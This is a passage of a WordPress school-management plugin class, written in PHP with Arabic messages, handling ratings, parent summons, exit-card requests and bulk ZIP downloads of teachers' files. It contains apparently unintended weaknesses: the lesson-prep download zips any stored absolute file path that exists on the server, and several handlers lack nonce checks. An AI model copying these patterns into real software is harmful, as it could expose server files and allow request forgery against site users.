            $stars   = intval($_POST['rating_stars'] ?? 5);
            $comment = sanitize_textarea_field($_POST['comment'] ?? '');

            if ($stars < 1 || $stars > 5) {
                wp_send_json_error('يرجى تحديد التقييم من 1 إلى 5 نجوم.');
            }

            if (mb_strlen($comment) > 250) {
                wp_send_json_error('التعليق يتجاوز الحد الأقصى المسموح به (250 حرف).');
            }

            $req_id = SM_DB::add_support_request(array(
                'user_id'      => $user_id,
                'category'     => 'rating',
                'title'        => 'تقييم المنظومة (' . $stars . ' نجوم)',
                'details'      => $comment,
                'rating_stars' => $stars,
                'status'       => 'new'
            ));

            if ($req_id) {
                SM_Logger::log('تقديم تقييم وشكر', "تم إرسال تقييم ($stars نجوم) بواسطة المستخدم ID: $user_id");
                wp_send_json_success(array('message' => 'شكراً جزيلاً لتقييمك وكلماتك الطيبة! يسعدنا دائماً تقديم الأفضل لكم.'));
            } else {
                wp_send_json_error('حدث خطأ أثناء حفظ التقييم.');
            }
        }
    }

    public function ajax_update_support_status() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('غير مصرح لك بتغيير حالة طلبات الدعم.');
        }

        $id     = intval($_POST['id'] ?? 0);
        $status = sanitize_text_field($_POST['status'] ?? 'new');

        if (!$id) wp_send_json_error('معرف الطلب غير صحيح.');

        if (SM_DB::update_support_request_status($id, $status)) {
            SM_Logger::log('تحديث حالة طلب دعم', "تم تغيير حالة الطلب ID: $id إلى: $status");
            wp_send_json_success(array('message' => 'تم تحديث حالة الطلب بنجاح.'));
        } else {
            wp_send_json_error('فشل تحديث حالة الطلب.');
        }
    }

    public function ajax_delete_support_request() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('غير مصرح لك بحذف سجلات الدعم.');
        }

        $id = intval($_POST['id'] ?? 0);
        if (!$id) wp_send_json_error('معرف الطلب غير صحيح.');

        if (SM_DB::delete_support_request($id)) {
            SM_Logger::log('حذف سجل دعم نهائياً', "تم حذف سجل الدعم/التقييم ID: $id نهائياً مع ملفه المرفق");
            wp_send_json_success(array('message' => 'تم حذف السجل والملف المرفق به بنجاح.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء حذف السجل.');
        }
    }

    public function ajax_send_quick_parent_note() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول للتمكن من التواصل مع ولي الأمر.');
        }

        $user = wp_get_current_user();
        $student_id = intval($_POST['student_id'] ?? 0);
        $note = sanitize_textarea_field($_POST['note'] ?? '');

        if (!$student_id || empty($note)) {
            wp_send_json_error('يرجى اختيار الطالب وكتابة نص الملاحظة.');
        }

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) {
            wp_send_json_error('الطالب المختار غير موجود.');
        }

        // Add record log
        SM_Logger::log('ملاحظة سريعة لولي الأمر', "أرسل المعلم {$user->display_name} ملاحظة لولي أمر الطالب {$student->name}: $note");

        wp_send_json_success(array('message' => 'تم إرسال الملاحظة بنجاح إلى ولي أمر الطالب ' . $student->name));
    }

    public function ajax_create_parent_summons() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_أولياء_الأمور') && !current_user_can('manage_options'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحيات المطلوبة لإصدار استدعاء ولي أمر.');
        }

        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_message_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $student_id = intval($_POST['student_id'] ?? 0);
        $reason     = sanitize_text_field($_POST['reason'] ?? '');
        $date       = sanitize_text_field($_POST['summons_date'] ?? current_time('Y-m-d'));
        $time       = sanitize_text_field($_POST['summons_time'] ?? '10:00');
        $dept       = sanitize_text_field($_POST['department_requester'] ?? 'شؤون الطلاب');
        $notes      = sanitize_textarea_field($_POST['notes'] ?? '');

        if (!$student_id || empty($reason)) {
            wp_send_json_error('يرجى اختيار الطالب وتدوين سبب الاستدعاء.');
        }

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('الطالب غير موجود.');

        global $wpdb;
        $inserted = $wpdb->insert("{$wpdb->prefix}sm_parent_summons", array(
            'student_id'           => $student_id,
            'parent_user_id'       => $student->parent_user_id,
            'reason'               => $reason,
            'summons_date'         => $date,
            'summons_time'         => $time,
            'department_requester' => $dept,
            'notes'                => $notes,
            'status'               => 'sent',
            'created_by'           => get_current_user_id(),
            'created_at'           => current_time('mysql')
        ));

        if ($inserted) {
            $summons_id = $wpdb->insert_id;
            SM_Logger::log('إصدار استدعاء ولي أمر', "تم إصدار استدعاء لولي أمر الطالب: {$student->name} (ID: $student_id) بسبب: $reason");
            wp_send_json_success(array('summons_id' => $summons_id, 'message' => 'تم تسجيل وإصدار استدعاء ولي الأمر بنجاح.'));
        } else {
            wp_send_json_error('فشل حفظ وثيقة الاستدعاء في قاعدة البيانات.');
        }
    }

    public function ajax_convert_summons_visit() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_أولياء_الأمور') && !current_user_can('manage_options'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحيات المطلوبة لتسجيل محضر الزيارة.');
        }

        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_message_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $summons_id    = intval($_POST['summons_id'] ?? 0);
        $summary       = sanitize_textarea_field($_POST['discussion_summary'] ?? '');
        $visit_notes   = sanitize_textarea_field($_POST['visit_notes'] ?? '');
        $cooperation   = sanitize_text_field($_POST['parent_cooperation'] ?? 'ممتاز');
        $eval_comments = sanitize_textarea_field($_POST['evaluation_comments'] ?? '');

        if (!$summons_id) wp_send_json_error('معرف الاستدعاء غير صحيح.');

        global $wpdb;
        $updated = $wpdb->update("{$wpdb->prefix}sm_parent_summons", array(
            'status'               => 'Attended',
            'actual_visit_date'    => current_time('mysql'),
            'discussion_summary'   => $summary,
            'visit_notes'          => $visit_notes,
            'staff_handler_id'     => get_current_user_id(),
            'parent_cooperation'   => $cooperation,
            'evaluation_comments' => $eval_comments
        ), array('id' => $summons_id));

        if ($updated !== false) {
            SM_Logger::log('توثيق زيارة ولي أمر', "تم تحويل الاستدعاء ID: $summons_id إلى محضر زيارة ومناقشة تقييم التعاون: $cooperation");
            wp_send_json_success(array('message' => 'تم توثيق زيارة ولي الأمر وتقييم اللقاء بنجاح.'));
        } else {
            wp_send_json_error('فشل حفظ محضر الزيارة.');
        }
    }

    public function ajax_submit_exit_card_request() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول لتقديم طلب بطاقة تصريح الخروج.');
        }

        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_user_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) {
            wp_send_json_error('فشل التحقق من أمان الطلب (Invalid Nonce)');
        }

        $student_id = intval($_POST['student_id'] ?? 0);
        $reason     = sanitize_text_field($_POST['reason'] ?? 'استخراج بطاقة تصريح خروج طالب');
        $req_date   = sanitize_text_field($_POST['requested_date'] ?? current_time('Y-m-d'));
        $notes      = sanitize_textarea_field($_POST['notes'] ?? '');

        if (!$student_id) {
            $current_uid = get_current_user_id();
            $st = SM_DB::get_student_by_parent($current_uid);
            if ($st) $student_id = $st->id;
        }

        if (!$student_id) {
            wp_send_json_error('يرجى تحديد الطالب المعني بطلب بطاقة الخروج.');
        }

        $student = SM_DB::get_student_by_id($student_id);
        if (!$student) wp_send_json_error('الطالب المحدد غير موجود.');

        global $wpdb;
        $inserted = $wpdb->insert("{$wpdb->prefix}sm_exit_card_requests", array(
            'student_id'      => $student_id,
            'parent_user_id'  => get_current_user_id(),
            'reason'          => $reason,
            'requested_date'  => $req_date,
            'notes'           => $notes,
            'status'          => 'submitted',
            'printing_status' => 'pending',
            'created_at'      => current_time('mysql')
        ));

        if ($inserted) {
            $req_id = $wpdb->insert_id;
            SM_Logger::log('طلب بطاقة تصريح خروج', "قدم الطالب/ولي الأمر طلب بطاقة تصريح خروج للطالب: {$student->name} (ID: $student_id)");
            wp_send_json_success(array('request_id' => $req_id, 'message' => 'تم تقديم طلب بطاقة تصريح الخروج بنجاح وهو الآن قيد المراجعة الإدارية.'));
        } else {
            wp_send_json_error('فشل حفظ طلب بطاقة الخروج.');
        }
    }

    public function ajax_update_exit_card_request_status() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_الطلاب') && !current_user_can('manage_options') && !current_user_can('manage_students'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحية المطلوبة.');
        }

        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_user_action')) {
            wp_send_json_error('فشل التحقق من أمان الطلب (Invalid Nonce)');
        }

        $req_id      = intval($_POST['request_id'] ?? 0);
        $new_status  = sanitize_text_field($_POST['status'] ?? '');
        $print_stat  = sanitize_text_field($_POST['printing_status'] ?? '');
        $review_note = sanitize_textarea_field($_POST['review_notes'] ?? '');

        if (!$req_id) wp_send_json_error('معرف الطلب غير صحيح.');

        global $wpdb;
        $update_data = array(
            'reviewed_by' => get_current_user_id(),
            'reviewed_at' => current_time('mysql')
        );

        if (!empty($new_status)) $update_data['status'] = $new_status;
        if (!empty($print_stat)) $update_data['printing_status'] = $print_stat;
        if (!empty($review_note)) $update_data['review_notes'] = $review_note;

        $updated = $wpdb->update("{$wpdb->prefix}sm_exit_card_requests", $update_data, array('id' => $req_id));

        if ($updated !== false) {
            wp_send_json_success(array('message' => 'تم تحديث حالة طلب بطاقة الخروج بنجاح.'));
        } else {
            wp_send_json_error('فشل تحديث حالة الطلب.');
        }
    }

    public function ajax_update_summons_status() {
        if (!is_user_logged_in() || (!current_user_can('إدارة_أولياء_الأمور') && !current_user_can('manage_options'))) {
            wp_send_json_error('عفواً، لا تمتلك الصلاحيات المطلوبة.');
        }

        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_message_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $summons_id = intval($_POST['summons_id'] ?? 0);
        $new_status = sanitize_text_field($_POST['status'] ?? 'sent');

        global $wpdb;
        $wpdb->update("{$wpdb->prefix}sm_parent_summons", array('status' => $new_status), array('id' => $summons_id));
        wp_send_json_success(array('message' => 'تم تحديث حالة الاستدعاء بنجاح.'));
    }

    public function ajax_send_message() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول لتقديم طلب استفسار.');
        }

        $nonce = $_POST['sm_message_nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_message_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('فشل التوثيق الأمني.');
        }

        $receiver_id = intval($_POST['receiver_id'] ?? 0);
        $student_id  = !empty($_POST['student_id']) ? intval($_POST['student_id']) : null;
        $message     = sanitize_textarea_field($_POST['message'] ?? '');

        if (empty($message)) {
            wp_send_json_error('يرجى كتابة نص الاستفسار.');
        }

        $sent = SM_DB::send_message(get_current_user_id(), $receiver_id, $message, $student_id);
        if ($sent) {
            wp_send_json_success(array('message' => 'تم إرسال استفسارك بنجاح'));
        } else {
            wp_send_json_error('تعذر إرسال الاستفسار، يرجى المحاولة لاحقاً.');
        }
    }

    public function ajax_get_educational_suggestions() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $query      = sanitize_text_field($_POST['query'] ?? '');
        $subject    = sanitize_text_field($_POST['subject'] ?? '');
        $input_type = sanitize_text_field($_POST['input_type'] ?? 'title');

        if (empty($query) || mb_strlen($query) < 2) {
            wp_send_json_success(array());
        }

        global $wpdb;
        $sql = "SELECT id, subject, input_type, content, usage_count FROM {$wpdb->prefix}sm_educational_inputs WHERE is_approved = 1 AND input_type = %s";
        $params = array($input_type);

        if (!empty($subject)) {
            $sql .= " AND subject = %s";
            $params[] = $subject;
        }

        $sql .= " AND content LIKE %s ORDER BY usage_count DESC, id DESC LIMIT 10";
        $params[] = '%' . $wpdb->esc_like($query) . '%';

        $results = $wpdb->get_results($wpdb->prepare($sql, $params));
        wp_send_json_success($results ?: array());
    }

    public function ajax_save_educational_input() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');

        $subject    = sanitize_text_field($_POST['subject'] ?? '');
        $input_type = sanitize_text_field($_POST['input_type'] ?? 'title');
        $content    = sanitize_textarea_field($_POST['content'] ?? '');

        if (empty($subject) || empty($content) || mb_strlen($content) < 3) {
            wp_send_json_error('يرجى اختيار المادة وإدخال محتوى صحيح.');
        }

        global $wpdb;
        $existing = $wpdb->get_row($wpdb->prepare(
            "SELECT id, usage_count FROM {$wpdb->prefix}sm_educational_inputs WHERE subject = %s AND input_type = %s AND content = %s LIMIT 1",
            $subject, $input_type, $content
        ));

        if ($existing) {
            $wpdb->update(
                "{$wpdb->prefix}sm_educational_inputs",
                array('usage_count' => $existing->usage_count + 1),
                array('id' => $existing->id)
            );
            wp_send_json_success(array('id' => $existing->id, 'usage_count' => $existing->usage_count + 1));
        } else {
            $wpdb->insert(
                "{$wpdb->prefix}sm_educational_inputs",
                array(
                    'subject'     => $subject,
                    'input_type'  => $input_type,
                    'content'     => $content,
                    'usage_count' => 1,
                    'is_approved' => 1,
                    'created_by'  => get_current_user_id(),
                    'created_at'  => current_time('mysql'),
                    'updated_at'  => current_time('mysql')
                )
            );
            wp_send_json_success(array('id' => $wpdb->insert_id, 'usage_count' => 1));
        }
    }

    public function ajax_get_school_prep_weeks() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized access');
        if (!wp_verify_nonce($_REQUEST['nonce'] ?? '', 'sm_admin_action') && !wp_verify_nonce($_REQUEST['nonce'] ?? '', 'eess_admin_action')) {
            wp_send_json_error('Security check failed');
        }

        global $wpdb;
        $school_id = intval($_REQUEST['school_id'] ?? 0);
        if ($school_id <= 0) {
            wp_send_json_error('Invalid school ID');
        }

        $user_id = get_current_user_id();
        $user_scope = EESS_Org_Helper::get_user_scope($user_id);
        if (!$user_scope['unrestricted']) {
            if (!empty($user_scope['schools']) && !in_array($school_id, $user_scope['schools'])) {
                wp_send_json_error('غير مصرح بالوصول لبيانات هذه المدرسة.');
            }
        }

        $query = "SELECT DISTINCT p.created_at, p.updated_at
                  FROM {$wpdb->prefix}sm_lesson_preps p
                  JOIN {$wpdb->prefix}eess_user_assignments ua ON p.teacher_id = ua.user_id
                  WHERE ua.school_id = %d AND p.status IN ('submitted', 'approved', 'returned', 'resubmitted', 'rejected')";

        $rows = $wpdb->get_results($wpdb->prepare($query, $school_id));

        $arabic_weeks = array(
            1 => 'الأسبوع الأول', 2 => 'الأسبوع الثاني', 3 => 'الأسبوع الثالث', 4 => 'الأسبوع الرابع',
            5 => 'الأسبوع الخامس', 6 => 'الأسبوع السادس', 7 => 'الأسبوع السابع', 8 => 'الأسبوع الثامن',
            9 => 'الأسبوع التاسع', 10 => 'الأسبوع العاشر', 11 => 'الأسبوع الحادي عشر', 12 => 'الأسبوع الثاني عشر',
            13 => 'الأسبوع الثالث عشر', 14 => 'الأسبوع الرابع عشر', 15 => 'الأسبوع الخامس عشر', 16 => 'الأسبوع السادس عشر'
        );

        $existing_weeks = array();
        $acad_anchor_ts = strtotime('2026-08-28 00:00:00');

        foreach ($rows as $r) {
            $ts = strtotime($r->updated_at ?: $r->created_at);
            $w = ($ts >= $acad_anchor_ts) ? (intval(floor(($ts - $acad_anchor_ts) / (7 * 86400))) + 1) : 1;
            if ($w > 0 && !in_array($w, $existing_weeks, true)) {
                $existing_weeks[] = $w;
            }
        }

        sort($existing_weeks, SORT_NUMERIC);

        $formatted = array();
        foreach ($existing_weeks as $w_num) {
            $formatted[] = array(
                'week_num' => $w_num,
                'week_name' => ($arabic_weeks[$w_num] ?? ('الأسبوع ' . $w_num)) . ' (Week ' . $w_num . ')'
            );
        }

        wp_send_json_success(array('weeks' => $formatted));
    }

    public function ajax_bulk_download_lesson_preps() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized access');
        if (!wp_verify_nonce($_REQUEST['nonce'] ?? '', 'sm_admin_action') && !wp_verify_nonce($_REQUEST['nonce'] ?? '', 'eess_admin_action')) {
            wp_send_json_error('Security check failed');
        }

        if (!class_exists('ZipArchive')) {
            wp_send_json_error('مكتبة ZipArchive غير مفعلة على هذا السيرفر.');
        }

        global $wpdb;
        $user_id = get_current_user_id();
        $user_scope = EESS_Org_Helper::get_user_scope($user_id);

        $download_scope = sanitize_text_field($_REQUEST['scope_type'] ?? 'all');
        $week_num      = intval($_REQUEST['week_num'] ?? 0);
        $month_val     = sanitize_text_field($_REQUEST['month_val'] ?? '');
        $date_val      = sanitize_text_field($_REQUEST['date_val'] ?? '');
        $date_from     = sanitize_text_field($_REQUEST['date_from'] ?? '');
        $date_to       = sanitize_text_field($_REQUEST['date_to'] ?? '');

        $query = "SELECT p.*, u.display_name as teacher_name
                  FROM {$wpdb->prefix}sm_lesson_preps p
                  JOIN {$wpdb->prefix}users u ON p.teacher_id = u.ID
                  WHERE p.status IN ('submitted', 'approved', 'returned', 'resubmitted', 'rejected')";
        $params = array();

        if (!$user_scope['unrestricted']) {
            if (!empty($user_scope['schools'])) {
                $placeholders = implode(',', array_fill(0, count($user_scope['schools']), '%d'));
                $query .= " AND (p.teacher_id IN (SELECT user_id FROM {$wpdb->prefix}eess_user_assignments WHERE school_id IN ($placeholders)) OR p.teacher_id IN (SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key IN ('eess_school_id', 'sm_school_id') AND meta_value IN ($placeholders)))";
                foreach ($user_scope['schools'] as $sch_id) $params[] = $sch_id;
                foreach ($user_scope['schools'] as $sch_id) $params[] = $sch_id;
            } else {
                $query .= " AND p.teacher_id = %d";
                $params[] = $user_id;
            }
        }

        if ($download_scope === 'month' && !empty($month_val)) {
            $query .= " AND DATE_FORMAT(p.lesson_date, '%%Y-%%m') = %s";
            $params[] = $month_val;
        } elseif ($download_scope === 'date' && !empty($date_val)) {
            $query .= " AND p.lesson_date = %s";
            $params[] = $date_val;
        } elseif ($download_scope === 'range' && !empty($date_from) && !empty($date_to)) {
            $query .= " AND p.lesson_date BETWEEN %s AND %s";
            $params[] = $date_from;
            $params[] = $date_to;
        }

        $query .= " ORDER BY p.created_at DESC, p.id DESC";

        $raw_records = !empty($params) ? $wpdb->get_results($wpdb->prepare($query, $params)) : $wpdb->get_results($query);

        // Filter by Academic Week using 30 August 2026 anchor logic
        $acad_anchor_ts = strtotime('2026-08-28 00:00:00');
        $records = array();

        foreach ($raw_records as $rec) {
            if ($download_scope === 'week' || $week_num > 0) {
                if ($week_num > 0) {
                    $p_ts = strtotime($rec->updated_at ?: $rec->created_at);
                    $cw = ($p_ts >= $acad_anchor_ts) ? (intval(floor(($p_ts - $acad_anchor_ts) / (7 * 86400))) + 1) : 1;
                    if ($cw !== $week_num) {
                        continue;
                    }
                }
            }
            $records[] = $rec;
        }

        if (empty($records)) {
            wp_send_json_error('لا توجد تحضيرات دروس مرفوعة تطابق خيارات الأرشيف المحددة.');
        }

        $upload_dir = wp_upload_dir();
        $zip_name = 'Lesson_Preparations_Archive_' . date('Y-m-d_His') . '.zip';
        $zip_path = $upload_dir['path'] . '/' . $zip_name;

        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
            wp_send_json_error('تعذر إنشاء ملف الأرشيف المضغوط.');
        }

        $added_count = 0;
        $skipped_count = 0;
        $added_inner_paths = array();

        foreach ($records as $rec) {
            $file_url = !empty($rec->file_url) ? $rec->file_url : '';
            if (empty($file_url) && !empty($rec->lesson_data)) {
                $parsed = json_decode($rec->lesson_data, true);
                $file_url = $parsed['file_url'] ?? '';
            }

            if (empty($file_url)) {
                $skipped_count++;
                continue;
            }

            // Enhanced multi-strategy local file path resolution
            $local_path = '';
            if (strpos($file_url, $upload_dir['baseurl']) !== false) {
                $local_path = str_replace($upload_dir['baseurl'], $upload_dir['basedir'], $file_url);
            } elseif (strpos($file_url, '/wp-content/uploads/') !== false) {
                $rel_path = substr($file_url, strpos($file_url, '/wp-content/uploads/') + 19);
                $local_path = $upload_dir['basedir'] . '/' . ltrim($rel_path, '/');
            } elseif (file_exists($file_url)) {
                $local_path = $file_url;
            } else {
                $parsed_path = wp_parse_url($file_url, PHP_URL_PATH);
                if ($parsed_path && file_exists(ABSPATH . ltrim($parsed_path, '/'))) {
                    $local_path = ABSPATH . ltrim($parsed_path, '/');
                }
            }

            if (empty($local_path) || !file_exists($local_path)) {
                $skipped_count++;
                continue;
            }

            $rec->file_url = $file_url;
            $std_filename = EESS_File_Naming_Service::generate_lesson_prep_filename($rec);
            $zip_folder = sanitize_file_name($rec->teacher_name ?: 'المعلم');
            $zip_inner_path = $zip_folder . '/' . $std_filename;

            // Ensure unique inner path inside ZIP to prevent collisions
            if (in_array($zip_inner_path, $added_inner_paths, true)) {
                $ext = pathinfo($std_filename, PATHINFO_EXTENSION);
                $base = pathinfo($std_filename, PATHINFO_FILENAME);
                $zip_inner_path = $zip_folder . '/' . $base . '_' . $rec->id . ($ext ? '.' . $ext : '');
            }

            $zip->addFile($local_path, $zip_inner_path);
            $added_inner_paths[] = $zip_inner_path;
            $added_count++;
        }

        $zip->close();

        if ($added_count === 0) {
            if (file_exists($zip_path)) @unlink($zip_path);
            wp_send_json_error('جميع سجلات تحضير الدروس المحددة لا تحتوي على ملفات مرفقة صالحة.');
        }

        SM_Logger::log('bulk_download', "قام المستخدم بإجراء تنزيل بالجملة لأرشيف التحضيرات ({$added_count} ملف)");

        if (ob_get_level()) {
            ob_end_clean();
        }

        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zip_name . '"');
        header('Content-Length: ' . filesize($zip_path));
        header('Pragma: no-cache');
        header('Expires: 0');
        readfile($zip_path);
        if (file_exists($zip_path)) {
            @unlink($zip_path);
        }
        exit;
    }

    public function ajax_bulk_download_term_plans() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized access');
        if (!wp_verify_nonce($_REQUEST['nonce'] ?? '', 'sm_admin_action') && !wp_verify_nonce($_REQUEST['nonce'] ?? '', 'eess_admin_action')) {
            wp_send_json_error('Security check failed');
        }

        if (!class_exists('ZipArchive')) {
            wp_send_json_error('مكتبة ZipArchive غير مفعلة على هذا السيرفر.');
        }

        global $wpdb;
        $user_id = get_current_user_id();
        $user_scope = EESS_Org_Helper::get_user_scope($user_id);

        $term_number = intval($_REQUEST['term_number'] ?? 0);

        $query = "SELECT tp.*, u.display_name as teacher_name
                  FROM {$wpdb->prefix}sm_term_plans tp
                  JOIN {$wpdb->prefix}users u ON tp.teacher_id = u.ID
                  WHERE tp.status IN ('submitted', 'approved', 'returned', 'resubmitted', 'rejected')";
        $params = array();

        if (!$user_scope['unrestricted']) {
            if (!empty($user_scope['schools'])) {
                $placeholders = implode(',', array_fill(0, count($user_scope['schools']), '%d'));
                $query .= " AND (tp.teacher_id IN (SELECT user_id FROM {$wpdb->prefix}eess_user_assignments WHERE school_id IN ($placeholders)) OR tp.teacher_id IN (SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key IN ('eess_school_id', 'sm_school_id') AND meta_value IN ($placeholders)))";
                foreach ($user_scope['schools'] as $sch_id) $params[] = $sch_id;
                foreach ($user_scope['schools'] as $sch_id) $params[] = $sch_id;
            } else {
                $query .= " AND tp.teacher_id = %d";
                $params[] = $user_id;
            }
        }

        if ($term_number > 0) {
            $query .= " AND tp.term_number = %d";
            $params[] = $term_number;
        }

        $query .= " ORDER BY tp.term_number ASC, tp.id DESC";

        $records = !empty($params) ? $wpdb->get_results($wpdb->prepare($query, $params)) : $wpdb->get_results($query);

        if (empty($records)) {
            wp_send_json_error('لا توجد خطط فصلية/سنوية مرفوعة تطابق خيارات التنزيل المحددة.');
        }

        $upload_dir = wp_upload_dir();
        $zip_name = 'Quarterly_Plans_Term_' . ($term_number ?: 'All') . '_' . date('Y-m-d_His') . '.zip';
        $zip_path = $upload_dir['path'] . '/' . $zip_name;

        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
            wp_send_json_error('تعذر إنشاء ملف الأرشيف المضغوط.');
        }

        $added_count = 0;
        $skipped_count = 0;

        foreach ($records as $rec) {
            $file_url = !empty($rec->plan_file_url) ? $rec->plan_file_url : ($rec->file_url ?? '');
            if (empty($file_url)) {
                $skipped_count++;
                continue;
            }

            $local_path = str_replace($upload_dir['baseurl'], $upload_dir['basedir'], $file_url);
            if (!file_exists($local_path)) {
                // Try relative path or absolute path if upload_dir replacement differed
                $parsed_path = wp_parse_url($file_url, PHP_URL_PATH);
                if ($parsed_path && file_exists(ABSPATH . ltrim($parsed_path, '/'))) {
                    $local_path = ABSPATH . ltrim($parsed_path, '/');
                }
            }

            if (!file_exists($local_path)) {
                $skipped_count++;
                continue;
            }

            // Sync property for Naming Service
            $rec->file_url = $file_url;
            $std_filename = EESS_File_Naming_Service::generate_term_plan_filename($rec);
            $zip_folder = sanitize_file_name($rec->teacher_name ?: 'المعلم');
            $zip_inner_path = $zip_folder . '/' . $std_filename;

            $zip->addFile($local_path, $zip_inner_path);
            $added_count++;
        }

        $zip->close();

        if ($added_count === 0) {
            if (file_exists($zip_path)) @unlink($zip_path);
            wp_send_json_error('جميع سجلات الخطط الفصلية المحددة لا تحتوي على ملفات مرفقة صالحة.');
        }

        SM_Logger::log('bulk_download', "قام المستخدم بإجراء تنزيل بالجملة لأرشيف الخطط الفصلية والسنوية ({$added_count} ملف)");

        if (ob_get_level()) {
            ob_end_clean();
        }

        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zip_name . '"');
        header('Content-Length: ' . filesize($zip_path));
        header('Pragma: no-cache');
        header('Expires: 0');
        readfile($zip_path);
        if (file_exists($zip_path)) {
            @unlink($zip_path);
        }
        exit;
    }
}
